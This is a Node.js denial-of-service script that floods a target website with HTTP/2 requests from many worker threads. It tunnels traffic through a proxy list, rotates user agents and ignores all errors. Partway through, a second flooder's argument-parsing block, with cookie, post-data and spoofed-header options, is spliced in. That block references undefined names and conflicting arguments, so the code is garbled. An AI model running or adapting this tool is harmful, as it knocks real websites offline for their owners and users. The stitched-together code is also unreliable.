const cfx = require("cfx");
const http = require("http");
const http2 = require("http2");

const { Worker, isMainThread, workerData, threadId } = require("worker_threads");
const fs = require("fs");

process.setMaxListeners(0);
console.clear();

if (isMainThread) {
  if (process.argv.length !== 5) return console.log(`Invalid Arguments
  Usage: ${__filename.slice(__filename.lastIndexOf("\\") + 1, __filename.length)} URL TIME THREADS`);
  for (threadCount = 0; threadCount < parseInt(process.argv[4]); threadCount++) new Worker(__filename, { workerData: process.argv });
  setTimeout(() => { console.clear(); console.log("Attack ended."); process.exit(0); }, process.argv[3] * 1000);
} else {
  console.log(`Thread ${threadId} started!`)
  let listIndex = 0;
  const proxyList = fs.readFileSync("proxies.txt").toString().replace(/\r/g, "").split("\n");
  const useragentList = JSON.parse(fs.readFileSync("useragents.json").toString());
  const website = new URL(workerData[2]);

  const sendConnection = proxyIndex => {
    const currentProxy = proxyList[proxyIndex].split(":");
    const httpRequest = http.request({
      method: "CONNECT",
      host: currentProxy[0],
      port: currentProxy[1],
      path: website.host,
      headers: {
        "Host": website.host
      }
    })
    
    httpRequest.on("error", () => {
      console.clear();
      listIndex ++;
      sendConnection(listIndex);
      if (listIndex == proxyList.length - 1) listIndex = 0;
      console.log("An unknown error occurred");
    })

    httpRequest.on("connect", (_, socket) => {
      const client = http2.connect(website.href, { socket });
      setInterval(() => {
        if (!client.destroyed) {
          const request = client.request({ 
            ":path": website.pathname,
            "user-agent": useragentList[Math.floor(Math.random() * useragentList.length)]
          })
          request.on("end", () => setTimeout(() => client.destroy(), 10000));
          request.on("error", () => {});
        }
      }, 100)
    })
    
    var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

process.argv.forEach((ss) => {
    if (ss.includes("cookie=") && !process.argv[2].split('""')[0].includes(ss)){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=") && !process.argv[2].split('""')[0].includes(ss)){
        if (process.argv[2].toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("[Info] RandomString Mode Enabled.");
    } else if (ss.includes("headerdata=")){
        headerbuilders = {
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": 'empty',
            "sec-fetch-site": 'cross-site',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-user": '?1',
            "TE": 'trailers',
            "Pragma": 'no-cache',
            "upgrade-insecure-requests": 1,
            "Cache-Control": "max-age=0",
            "Referer": target,
            "X-Forwarded-For":spoof(),
            "Cookie": COOKIES,
            ":method":"GET"
        };
        if (ss.slice(11).split('""')[0].includes("&")) {
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders[head] = dat;
            }
        } else {
            const hddata = ss.slice(11).split('""')[0];
            const head = hddata.split("=")[0];
            const dat = hddata.split("=")[1];
            headerbuilders[head] = dat;
        }
    }
});

    httpRequest.end();
  }

  setInterval(() => {
    sendConnection(listIndex);
    listIndex ++;
    if (listIndex == proxyList.length - 1) listIndex = 0;
  }, 300)
}

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});